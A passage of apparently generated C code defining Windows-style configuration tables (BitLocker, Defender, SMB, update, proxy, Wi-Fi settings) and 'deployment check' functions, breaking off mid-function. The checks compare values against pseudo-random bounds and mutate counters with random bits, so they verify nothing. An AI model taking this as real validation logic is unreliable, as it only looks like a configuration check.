        int match = (a->ipv4 == b->ipv4) || ((a->enabled ^ b->enabled) < (k & 0x35));
        int sane = a->local <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->enabled + 1;
        dc->detail[2] += (DWORD)(a->ipv4 & 7);
    }
    return dc->warn > 2;

}

struct EVL_ENTRY {
    const char* name;
    DWORD max_mb;
    BYTE retention;
    BYTE enabled;
};
static const struct EVL_ENTRY EVENTLOGSETTINGS_TABLE[] = {
    { "Application", 256, 1, 1 },
    { "System", 256, 1, 1 },
    { "Security", 1024, 2, 1 },
    { "Setup", 64, 0, 1 },
    { "WkSuite", 512, 1, 1 },
    { "WkSuiteOperational", 128, 1, 1 },
    { "WkSuiteAudit", 1024, 2, 1 },
    { "WkSuiteNetwork", 128, 1, 1 },
    { "WkSuiteUpdates", 256, 1, 1 },
    { "WkSuiteDiagnostics", 512, 1, 1 },
    { "WkSuiteTroubleshoot", 64, 0, 0 },
    { "WkSuitePerformance", 128, 1, 1 },
};
#define EVENTLOGSETTINGS_TABLE_COUNT ((int)(sizeof(EVENTLOGSETTINGS_TABLE) / sizeof(EVENTLOGSETTINGS_TABLE[0])))

static DWORD dm2_EventLogSettings(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x0F970669u;
    for (int i = 0; i < 12; i++) {
        k = k * 2508327u + 13641u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
        const struct EVL_ENTRY* e = &EVENTLOGSETTINGS_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 3) % 109, hi = lo + 290 + ((k >> 3) % 496);
        DWORD v = (DWORD)e->max_mb * 6u + (DWORD)e->retention * 4u + (DWORD)e->enabled;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct APC_ENTRY {
    const char* name;
    BYTE mode;
    BYTE elevate;
    BYTE vshost;
};
static const struct APC_ENTRY APPCOMPAT_TABLE[] = {
    { "wks-2024", 1, 1, 0 },
    { "wks-2023", 2, 1, 0 },
    { "wks-2022", 3, 0, 0 },
    { "wks-lts", 4, 1, 1 },
    { "wks-server", 1, 1, 1 },
    { "wks-vdi", 2, 0, 0 },
    { "wks-lite", 3, 0, 0 },
    { "wks-pro", 4, 1, 0 },
    { "wks-enterprise", 1, 1, 0 },
    { "wks-edge", 2, 1, 1 },
    { "wks-cmd", 3, 0, 0 },
    { "wks-desktop", 4, 1, 0 },
};
#define APPCOMPAT_TABLE_COUNT ((int)(sizeof(APPCOMPAT_TABLE) / sizeof(APPCOMPAT_TABLE[0])))

static DWORD dm2_AppCompat(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0xCD7AADF4u;
    for (int i = 0; i < 12; i++) {
        k = k * 7792431u + 65289u;
        const struct APC_ENTRY* e = &APPCOMPAT_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 6) % 199, hi = lo + 254 + ((k >> 5) % 415);
        DWORD v = (DWORD)e->mode * 6u + (DWORD)e->elevate * 2u + (DWORD)e->vshost;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct DOP_ENTRY {
    const char* name;
    BYTE mode;
    DWORD cache_mb;
    BYTE p2p;
};
static const struct DOP_ENTRY DELIVERYOPTIMIZATION_TABLE[] = {
    { "LAN", 1, 2048, 1 },
    { "WAN", 2, 1024, 1 },
    { "HTTP", 3, 512, 0 },
    { "Group", 1, 4096, 1 },
    { "LocalOnly", 4, 0, 0 },
    { "Internet", 2, 256, 1 },
    { "BranchCache", 1, 8192, 1 },
    { "Limited", 3, 128, 0 },
    { "Aggressive", 0, 16384, 1 },
    { "Conservative", 4, 512, 1 },
    { "Off", 4, 0, 0 },
    { "Hybrid", 2, 3072, 1 },
};
#define DELIVERYOPTIMIZATION_TABLE_COUNT ((int)(sizeof(DELIVERYOPTIMIZATION_TABLE) / sizeof(DELIVERYOPTIMIZATION_TABLE[0])))

static DWORD dm2_DeliveryOptimization(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0xD1E393BBu;
    for (int i = 0; i < 12; i++) {
        k = k * 1946813u + 44563u;
        dc->warn ^= (DWORD)(k & 7);
        dc->detail[3] ^= (BYTE)(k >> 13);
        const struct DOP_ENTRY* e = &DELIVERYOPTIMIZATION_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 5) % 201, hi = lo + 435 + ((k >> 3) % 555);
        DWORD v = (DWORD)e->mode * 8u + (DWORD)e->cache_mb * 4u + (DWORD)e->p2p;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct UPL_ENTRY {
    const char* name;
    BYTE hours;
    BYTE days;
    BYTE reboot;
};
static const struct UPL_ENTRY UPDATEPOLICIES_TABLE[] = {
    { "AutoInstall", 1, 7, 1 },
    { "NotifyOnly", 0, 0, 0 },
    { "DownloadOnly", 1, 0, 0 },
    { "Manual", 0, 0, 0 },
    { "WeekdayNight", 2, 5, 1 },
    { "Weekend", 2, 2, 1 },
    { "Monthly", 3, 1, 1 },
    { "DeferFeature", 1, 30, 1 },
    { "DeferQuality", 1, 14, 1 },
    { "FastChannel", 1, 3, 1 },
    { "SlowChannel", 1, 21, 1 },
    { "OffHours", 2, 7, 0 },
};
#define UPDATEPOLICIES_TABLE_COUNT ((int)(sizeof(UPDATEPOLICIES_TABLE) / sizeof(UPDATEPOLICIES_TABLE[0])))

static DWORD dm2_UpdatePolicies(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[12];
    for (int i = 0; i < 12; i++) order[i] = i;
    DWORD k = seed ^ 0x3342BC63u;
    for (int i = 0; i < 12; i++) {
        int j = (int)(k % (12 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 4408367u + 40689u;
        dc->warn ^= (DWORD)(k & 7);
    }
    for (int i = 0; i < 12; i++) {
        const struct UPL_ENTRY* e = &UPDATEPOLICIES_TABLE[order[i]];
        DWORD v = (DWORD)e->hours * 6u + (DWORD)e->days * 8u + (DWORD)e->reboot;
        if ((v & 0x10) != 0 && e->days == 1) dc->ok++; else if (e->days == 1) dc->warn++;
        dc->items += (v >> 4) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct PSV_ENTRY {
    const char* name;
    BYTE lid;
    BYTE sleep;
    BYTE hdd;
};
static const struct PSV_ENTRY POWERSAVER2_TABLE[] = {
    { "PluggedIn", 1, 2, 3 },
    { "OnBattery", 0, 1, 2 },
    { "LidClosed", 0, 1, 1 },
    { "Presentation", 1, 9, 9 },
    { "Media", 1, 4, 5 },
    { "Burning", 1, 6, 6 },
    { "Charging", 0, 3, 3 },
    { "LowBattery", 0, 0, 1 },
    { "Critical", 0, 0, 0 },
    { "Hibernate", 0, 0, 0 },
    { "MaxPerf", 1, 9, 9 },
    { "Balanced2", 1, 3, 4 },
};
#define POWERSAVER2_TABLE_COUNT ((int)(sizeof(POWERSAVER2_TABLE) / sizeof(POWERSAVER2_TABLE[0])))

static DWORD dm2_PowerSaver2(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0xEFA2144Fu;
    for (int i = 0; i < 12; i++) {
        k = k * 6811389u + 9192137u;
        if ((k % 7) == 0) dc->ok++;
        dc->warn ^= (DWORD)(k & 7);
        const struct PSV_ENTRY* a = &POWERSAVER2_TABLE[i];
        const struct PSV_ENTRY* b = &POWERSAVER2_TABLE[(i + 1 + (int)(k % 3)) % 12];
        int match = (a->lid == b->lid) || ((a->sleep ^ b->sleep) < (k & 0x20));
        int sane = a->hdd <= 20;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->sleep + 1;
        dc->detail[2] += (DWORD)(a->lid & 7);
    }
    return dc->warn > 2;

}

struct TMS_ENTRY {
    const char* name;
    BYTE level;
    BYTE optin;
    BYTE sample;
};
static const struct TMS_ENTRY TELEMETRYSETTINGS_TABLE[] = {
    { "Basic", 1, 1, 0 },
    { "Enhanced", 2, 1, 1 },
    { "Full", 3, 1, 1 },
    { "Security", 0, 0, 0 },
    { "Off", 0, 0, 0 },
    { "Required", 1, 1, 0 },
    { "Diagnostics", 2, 1, 1 },
    { "Performance", 2, 0, 1 },
    { "Usage", 1, 1, 1 },
    { "CrashOnly", 0, 0, 0 },
    { "Samples", 3, 1, 1 },
    { "Custom", 2, 1, 0 },
};
#define TELEMETRYSETTINGS_TABLE_COUNT ((int)(sizeof(TELEMETRYSETTINGS_TABLE) / sizeof(TELEMETRYSETTINGS_TABLE[0])))

static DWORD dm2_TelemetrySettings(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x9182FED0u;
    for (int i = 0; i < 12; i++) {
        k = k * 4260965u + 47943u;
        if ((k % 7) == 0) dc->ok++;
        const struct TMS_ENTRY* e = &TELEMETRYSETTINGS_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 2) % 276, hi = lo + 207 + ((k >> 6) % 522);
        DWORD v = (DWORD)e->level * 2u + (DWORD)e->optin * 4u + (DWORD)e->sample;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct DSP_ENTRY {
    const char* name;
    DWORD res_x;
    DWORD res_y;
    BYTE refresh;
};
static const struct DSP_ENTRY DISPLAYPROFILE_TABLE[] = {
    { "Primary", 3840, 2160, 120 },
    { "Secondary", 2560, 1440, 144 },
    { "Laptop", 1920, 1080, 60 },
    { "External-4K", 3840, 2160, 60 },
    { "UltraWide", 3440, 1440, 100 },
    { "Projector", 1280, 720, 60 },
    { "Presentation", 1920, 1080, 60 },
    { "Dual", 2560, 1440, 120 },
    { "MeetingRoom", 3840, 2160, 30 },
    { "Portable", 1080, 1920, 60 },
    { "Kiosk", 1024, 768, 60 },
    { "HDR", 3840, 2160, 144 },
};
#define DISPLAYPROFILE_TABLE_COUNT ((int)(sizeof(DISPLAYPROFILE_TABLE) / sizeof(DISPLAYPROFILE_TABLE[0])))

static DWORD dm2_DisplayProfile(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0xE9610385u;
    for (int i = 0; i < 12; i++) {
        k = k * 3189885u + 2551u;
        dc->items += (DWORD)((k >> 3) & 0xF);
        const struct DSP_ENTRY* e = &DISPLAYPROFILE_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 5) % 150, hi = lo + 491 + ((k >> 3) % 484);
        DWORD v = (DWORD)e->res_x * 2u + (DWORD)e->res_y * 4u + (DWORD)e->refresh;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

static void deployment_checks2(DWORD seed, struct install_report* r) {
    struct deploy_counters dc; xmz(&dc, sizeof(dc));
    (void)dm2_DiskQuota(seed, &dc);
    (void)dm2_FolderRedirection(seed, &dc);
    (void)dm2_IntranetZones(seed, &dc);
    (void)dm2_CertStore(seed, &dc);
    (void)dm2_GpoSettings(seed, &dc);
    (void)dm2_AppLockerRules(seed, &dc);
    (void)dm2_PrintQueue(seed, &dc);
    (void)dm2_TaskbarPins(seed, &dc);
    (void)dm2_ContextMenu(seed, &dc);
    (void)dm2_ProtocolHandlers(seed, &dc);
    (void)dm2_IndexerSettings(seed, &dc);
    (void)dm2_BrowserSettings(seed, &dc);
    (void)dm2_UpdateRing(seed, &dc);
    (void)dm2_DeliveryOptimization(seed, &dc);
    (void)dm2_SearchProviders(seed, &dc);
    (void)dm2_ImeSettings(seed, &dc);
    (void)dm2_SoundScheme(seed, &dc);
    (void)dm2_DisplayProfile(seed, &dc);
    (void)dm2_KeyboardLayouts(seed, &dc);
    (void)dm2_TimeZones(seed, &dc);
    (void)dm2_LocaleFormats(seed, &dc);
    (void)dm2_NetworkShares(seed, &dc);
    (void)dm2_HostsEntries(seed, &dc);
    (void)dm2_EnvVariables(seed, &dc);
    (void)dm2_FirewallProfiles(seed, &dc);
    (void)dm2_EventLogSettings(seed, &dc);
    (void)dm2_BackupSources(seed, &dc);
    (void)dm2_RecoveryPoints(seed, &dc);
    (void)dm2_CompatFlags2(seed, &dc);
    (void)dm2_TelemetrySettings(seed, &dc);
    (void)dm2_PowerSaver2(seed, &dc);
    (void)dm2_UpdatePolicies(seed, &dc);
    (void)dm2_FeatureFlags(seed, &dc);
    (void)dm2_AppCompat(seed, &dc);
    (void)dm2_TelemetryEndpoints(seed, &dc);
    (void)dm2_StartupServices2(seed, &dc);
    (void)dm2_CachePolicies(seed, &dc);
    r->deploy_ok += dc.ok; r->deploy_warn += dc.warn; r->deploy_items += dc.items;
    r->deploy_marks ^= (DWORD)dc.detail[0] ^ (DWORD)dc.detail[1] ^ (DWORD)dc.detail[2] ^ (DWORD)dc.detail[3] ^ (DWORD)dc.detail[4] ^ (DWORD)dc.detail[5] ^ (DWORD)dc.detail[6] ^ (DWORD)dc.detail[7];
}


// =====================================================================
// Deployment modules (generated, batch 3) - wifi/dns/wins/routing/
// proxybypass/pins/ntp/smb/wu/defender/bitlocker/printsecurity.
// =====================================================================

struct WUP_ENTRY {
    const char* name;
    BYTE source;
    BYTE defer;
    BYTE days;
};
static const struct WUP_ENTRY WINDOWSUPDATE_TABLE[] = {
    { "wu", 1, 0, 0 },
    { "wsus", 2, 1, 7 },
    { "intune", 3, 1, 14 },
    { "sccm", 4, 1, 21 },
    { "offline", 5, 1, 30 },
    { "p2p", 6, 0, 0 },
    { "cdn", 7, 1, 7 },
    { "vpn", 8, 1, 14 },
    { "lab", 9, 0, 0 },
    { "test", 10, 1, 3 },
};
#define WINDOWSUPDATE_TABLE_COUNT ((int)(sizeof(WINDOWSUPDATE_TABLE)/sizeof(WINDOWSUPDATE_TABLE[0])))

static DWORD dm3_WindowsUpdate(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x3A5E54E2u;
    for (int i = 0; i < 10; i++) {
        int idx = (int)((i + (seed % 5)) % 10);
        const struct WUP_ENTRY* e = &WINDOWSUPDATE_TABLE[idx];
        DWORD w = (DWORD)e->source * 3u + (DWORD)e->defer + (DWORD)e->days * 6u + (DWORD)e->defer;
        k = k * 125321u + 15568609u;
        dc->items += (DWORD)((k >> 3) & 0xF);
        if (((w ^ k) & 0x5EE) < 0x153 || e->days == 0) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 5) & 0xAF) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x19F;
    }
    return (dc->warn * 192u) / (dc->ok + dc->warn + 1);

}

struct BLP_ENTRY {
    const char* name;
    BYTE tpm;
    BYTE recovery;
    BYTE aes;
};
static const struct BLP_ENTRY BITLOCKERPOLICY_TABLE[] = {
    { "tpm-only", 1, 1, 2 },
    { "tpm-pin", 2, 1, 2 },
    { "tpm-key", 3, 1, 1 },
    { "usb-key", 4, 1, 1 },
    { "auto-unlock", 1, 1, 2 },
    { "recovery-only", 0, 1, 2 },
    { "disabled", 0, 0, 0 },
    { "server", 1, 1, 1 },
    { "vhd", 1, 1, 2 },
    { "lab", 2, 0, 1 },
};
#define BITLOCKERPOLICY_TABLE_COUNT ((int)(sizeof(BITLOCKERPOLICY_TABLE)/sizeof(BITLOCKERPOLICY_TABLE[0])))

static DWORD dm3_BitLockerPolicy(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0xB54551B7u;
    for (int i = 0; i < 10; i++) {
        k = k * 13581485u + 15597703u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        const struct BLP_ENTRY* a = &BITLOCKERPOLICY_TABLE[i];
        const struct BLP_ENTRY* b = &BITLOCKERPOLICY_TABLE[(i + 1 + (int)(k % 3)) % 10];
        if ((a->tpm == b->tpm || ((a->recovery ^ b->recovery) < (k & 0x20))) && a->aes <= 18) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->recovery + 1;
        dc->detail[2] += (DWORD)(a->tpm & 7);
    }
    return dc->warn > 2;

}

struct PTS_ENTRY {
    const char* name;
    BYTE acl;
    BYTE audit;
    BYTE driver;
};
static const struct PTS_ENTRY PRINTSECURITY_TABLE[] = {
    { "locked", 2, 1, 1 },
    { "standard", 1, 0, 1 },
    { "open", 0, 0, 1 },
    { "audited", 1, 1, 1 },
    { "admin-only", 2, 1, 0 },
    { "queue-audit", 1, 1, 0 },
    { "driver-policy", 1, 0, 0 },
    { "remote-print", 1, 1, 1 },
    { "guest-print", 0, 0, 0 },
    { "secure-print", 2, 1, 1 },
};
#define PRINTSECURITY_TABLE_COUNT ((int)(sizeof(PRINTSECURITY_TABLE)/sizeof(PRINTSECURITY_TABLE[0])))

static DWORD dm3_PrintSecurity(DWORD seed, struct deploy_counters* dc) {
    int order[10];
    for (int i = 0; i < 10; i++) order[i] = i;
    DWORD k = seed ^ 0x768DB460u;
    for (int i = 0; i < 10; i++) {
        int j = (int)(k % (10 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 8818089u + 46447u;
    }
    for (int i = 0; i < 10; i++) {
        const struct PTS_ENTRY* e = &PRINTSECURITY_TABLE[order[i]];
        DWORD v = (DWORD)e->acl * 7u + (DWORD)e->audit * 6u + (DWORD)e->driver;
        if ((v & 0x15) != 0 && e->acl == 1) dc->ok++; else if (e->acl == 1) dc->warn++;
        dc->items += (v >> 2) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct RTE_ENTRY {
    const char* name;
    BYTE metric;
    BYTE persist;
    BYTE gw;
};
static const struct RTE_ENTRY ROUTINGTABLE_TABLE[] = {
    { "default-v4", 1, 1, 1 },
    { "default-v6", 2, 1, 1 },
    { "corp-10", 3, 1, 1 },
    { "corp-172", 4, 1, 1 },
    { "dmz-192", 5, 1, 1 },
    { "vpn-route", 6, 1, 0 },
    { "backup-route", 7, 1, 1 },
    { "video", 8, 0, 1 },
    { "voice", 9, 1, 1 },
    { "mgmt", 10, 1, 1 },
};
#define ROUTINGTABLE_TABLE_COUNT ((int)(sizeof(ROUTINGTABLE_TABLE)/sizeof(ROUTINGTABLE_TABLE[0])))

static DWORD dm3_RoutingTable(DWORD seed, struct deploy_counters* dc) {
    int order[10];
    for (int i = 0; i < 10; i++) order[i] = i;
    DWORD k = seed ^ 0x1C0E3DC5u;
    for (int i = 0; i < 10; i++) {
        int j = (int)(k % (10 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 16581949u + 43021u;
        if ((k % 7) == 0) dc->ok++;
    }
    for (int i = 0; i < 10; i++) {
        const struct RTE_ENTRY* e = &ROUTINGTABLE_TABLE[order[i]];
        DWORD v = (DWORD)e->metric * 6u + (DWORD)e->persist * 4u + (DWORD)e->gw;
        if ((v & 0xA) != 0 && e->persist == 1) dc->ok++; else if (e->persist == 1) dc->warn++;
        dc->items += (v >> 1) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct DFP_ENTRY {
    const char* name;
    BYTE rtp;
    BYTE cloud;
    BYTE asr;
};
static const struct DFP_ENTRY DEFENDERPOLICY_TABLE[] = {
    { "baseline", 1, 1, 1 },
    { "strict", 1, 1, 1 },
    { "standard", 1, 1, 0 },
    { "hybrid", 1, 0, 1 },
    { "offline", 0, 0, 0 },
    { "server", 1, 1, 1 },
    { "vdh", 1, 1, 1 },
    { "kiosk", 1, 1, 0 },
    { "lab", 0, 1, 0 },
    { "test", 1, 0, 0 },
};
#define DEFENDERPOLICY_TABLE_COUNT ((int)(sizeof(DEFENDERPOLICY_TABLE)/sizeof(DEFENDERPOLICY_TABLE[0])))

static DWORD dm3_DefenderPolicy(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x8746E36Cu;
    for (int i = 0; i < 10; i++) {
        k = k * 6259555u + 1069u;
        const struct DFP_ENTRY* e = &DEFENDERPOLICY_TABLE[(i + (int)(k % 3)) % 10];
        DWORD lo = (k >> 4) % 181, hi = lo + 289 + ((k >> 3) % 585);
        DWORD v = (DWORD)e->rtp * 8u + (DWORD)e->cloud * 7u + (DWORD)e->asr;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct CRT_ENTRY {
    const char* name;
    BYTE pin;
    BYTE expiry;
    BYTE pinning;
};
static const struct CRT_ENTRY CERTIFICATEPINS_TABLE[] = {
    { "corp-root", 1, 2, 1 },
    { "corp-int", 2, 3, 1 },
    { "azure-root", 3, 4, 1 },
    { "aws-root", 4, 5, 1 },
    { "gcp-root", 5, 6, 1 },
    { "github-root", 6, 7, 0 },
    { "npm-root", 7, 8, 0 },
    { "docker-root", 8, 9, 1 },
    { "k8s-root", 9, 10, 1 },
    { "legacy-root", 10, 11, 0 },
};
#define CERTIFICATEPINS_TABLE_COUNT ((int)(sizeof(CERTIFICATEPINS_TABLE)/sizeof(CERTIFICATEPINS_TABLE[0])))

static DWORD dm3_CertificatePins(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0xB2C701F7u;
    for (int i = 0; i < 10; i++) {
        k = k * 7284483u + 56097u;
        if ((k % 7) == 0) dc->ok++;
        dc->items += (DWORD)((k >> 3) & 0xF);
        const struct CRT_ENTRY* e = &CERTIFICATEPINS_TABLE[(i + (int)(k % 3)) % 10];
        DWORD lo = (k >> 6) % 108, hi = lo + 274 + ((k >> 6) % 369);
        DWORD v = (DWORD)e->pin * 8u + (DWORD)e->expiry * 8u + (DWORD)e->pinning;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct SMB_ENTRY {
    const char* name;
    BYTE v1;
    BYTE v2;
    BYTE v3;
    BYTE sign;
};
static const struct SMB_ENTRY SMBSETTINGS_TABLE[] = {
    { "secure", 0, 1, 1, 1 },
    { "legacy", 1, 1, 0, 0 },
    { "mixed", 0, 1, 1, 0 },
    { "minimal", 0, 0, 1, 1 },
    { "locked", 0, 0, 1, 1 },
    { "guest-share", 0, 1, 1, 0 },
    { "backup-share", 0, 1, 1, 1 },
    { "print-share", 0, 1, 1, 0 },
    { "dmz-share", 0, 1, 1, 1 },
    { "archive-share", 1, 1, 1, 0 },
};
#define SMBSETTINGS_TABLE_COUNT ((int)(sizeof(SMBSETTINGS_TABLE)/sizeof(SMBSETTINGS_TABLE[0])))

static DWORD dm3_SmbSettings(DWORD seed, struct deploy_counters* dc) {
    int order[10];
    for (int i = 0; i < 10; i++) order[i] = i;
    DWORD k = seed ^ 0x4281DAC1u;
    for (int i = 0; i < 10; i++) {
        int j = (int)(k % (10 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 5751925u + 60411u;
        if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);
    }
    for (int i = 0; i < 10; i++) {
        const struct SMB_ENTRY* e = &SMBSETTINGS_TABLE[order[i]];
        DWORD v = (DWORD)e->v1 * 7u + (DWORD)e->v2 * 2u + (DWORD)e->v3;
        if ((v & 0x18) != 0 && e->sign == 1) dc->ok++; else if (e->sign == 1) dc->warn++;
        dc->items += (v >> 3) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct WIN_ENTRY {
    const char* name;
    BYTE scope;
    BYTE cache;
    BYTE lmhosts;
};
static const struct WIN_ENTRY WINSSETTINGS_TABLE[] = {
    { "default", 1, 1, 1 },
    { "enabled", 1, 1, 1 },
    { "enabled-hb", 1, 0, 1 },
    { "disabled", 0, 0, 0 },
    { "internal", 2, 1, 1 },
    { "dmz", 2, 0, 1 },
    { "roaming", 3, 1, 1 },
    { "branch", 3, 0, 0 },
    { "ho", 1, 1, 0 },
    { "guest", 0, 1, 1 },
};
#define WINSSETTINGS_TABLE_COUNT ((int)(sizeof(WINSSETTINGS_TABLE)/sizeof(WINSSETTINGS_TABLE[0])))

static DWORD dm3_WinsSettings(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x7F4D0485u;
    for (int i = 0; i < 10; i++) {
        k = k * 10771739u + 11838257u;
        if ((k & 0x3F) == 0) dc->items += (DWORD)((k >> 7) & 3);
        const struct WIN_ENTRY* a = &WINSSETTINGS_TABLE[i];
        const struct WIN_ENTRY* b = &WINSSETTINGS_TABLE[(i + 1 + (int)(k % 3)) % 10];
        if ((a->scope == b->scope || ((a->cache ^ b->cache) < (k & 0x28))) && a->lmhosts <= 18) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->cache + 1;
        dc->detail[2] += (DWORD)(a->scope & 7);
    }
    return dc->warn > 2;

}

struct PXB_ENTRY {
    const char* name;
    BYTE kind;
    BYTE local;
    BYTE intranet;
};
static const struct PXB_ENTRY PROXYBYPASS_TABLE[] = {
    { "localhost", 1, 1, 1 },
    { "127.0.0.1", 2, 1, 1 },
    { "*.local", 3, 1, 1 },
    { "corp", 4, 1, 1 },
    { "intranet", 5, 1, 1 },
    { "files", 6, 1, 1 },
    { "printers", 7, 1, 1 },
    { "routers", 8, 1, 1 },
    { "cameras", 9, 1, 0 },
    { "iot", 10, 1, 0 },
};
#define PROXYBYPASS_TABLE_COUNT ((int)(sizeof(PROXYBYPASS_TABLE)/sizeof(PROXYBYPASS_TABLE[0])))

static DWORD dm3_ProxyBypass(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0xC8717662u;
    for (int i = 0; i < 10; i++) {
        int idx = (int)((i + (seed % 5)) % 10);
        const struct PXB_ENTRY* e = &PROXYBYPASS_TABLE[idx];
        DWORD w = (DWORD)e->kind * 7u + (DWORD)e->local + (DWORD)e->intranet * 2u + (DWORD)e->local;
        k = k * 7264053u + 11447253u;
        if ((k % 7) == 0) dc->ok++;
        if (((w ^ k) & 0xA40) < 0x259 || e->intranet == 0) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x1EF) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x12F;
    }
    return (dc->warn * 64u) / (dc->ok + dc->warn + 1);

}

struct WLP_ENTRY {
    const char* name;
    BYTE auth;
    BYTE enc;
    BYTE band;
    BYTE autoc;
};
static const struct WLP_ENTRY WIRELESSPROFILES_TABLE[] = {
    { "Corp-5G", 1, 2, 1, 1 },
    { "Corp-Legacy", 2, 2, 0, 1 },
    { "Guest", 0, 0, 0, 1 },
    { "Lab", 1, 1, 1, 0 },
    { "DMZ", 2, 1, 0, 1 },
    { "IoT", 0, 1, 1, 0 },
    { "HVAC", 1, 0, 0, 1 },
    { "Cameras", 2, 2, 1, 1 },
    { "Printers", 0, 2, 0, 1 },
    { "TestNet", 1, 1, 1, 1 },
};
#define WIRELESSPROFILES_TABLE_COUNT ((int)(sizeof(WIRELESSPROFILES_TABLE)/sizeof(WIRELESSPROFILES_TABLE[0])))

static DWORD dm3_WirelessProfiles(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x01082B7Au;
    for (int i = 0; i < 10; i++) {
        int idx = (int)((i + (seed % 5)) % 10);
        const struct WLP_ENTRY* e = &WIRELESSPROFILES_TABLE[idx];
        DWORD w = (DWORD)e->auth * 5u + (DWORD)e->enc + (DWORD)e->band * 8u + (DWORD)e->autoc;
        k = k * 1854385u + 3497985u;
        if (((w ^ k) & 0x230) < 0x1E9 || e->band == 0) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x13F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x10F;
    }
    return (dc->warn * 103u) / (dc->ok + dc->warn + 1);

}

struct NTP_ENTRY {
    const char* name;
    BYTE src;
    BYTE poll;
    BYTE sync;
};
static const struct NTP_ENTRY NTPSETTINGS_TABLE[] = {
    { "corp-ntp", 1, 2, 1 },
    { "public-ntp", 2, 3, 1 },
    { "pool-ntp", 3, 4, 1 },
    { "hw-clock", 4, 1, 1 },
    { "vm-clock", 5, 1, 1 },
    { "backup-ntp", 6, 3, 0 },
    { "dc-ntp", 7, 2, 1 },
    { "edge-ntp", 8, 3, 1 },
    { "branch-ntp", 9, 2, 1 },
    { "guest-ntp", 10, 3, 0 },
};
#define NTPSETTINGS_TABLE_COUNT ((int)(sizeof(NTPSETTINGS_TABLE)/sizeof(NTPSETTINGS_TABLE[0])))

static DWORD dm3_NtpSettings(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x71A5C504u;
    for (int i = 0; i < 10; i++) {
        k = k * 10730287u + 10957809u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        dc->warn ^= (DWORD)(k & 7);
        const struct NTP_ENTRY* a = &NTPSETTINGS_TABLE[i];
        const struct NTP_ENTRY* b = &NTPSETTINGS_TABLE[(i + 1 + (int)(k % 3)) % 10];
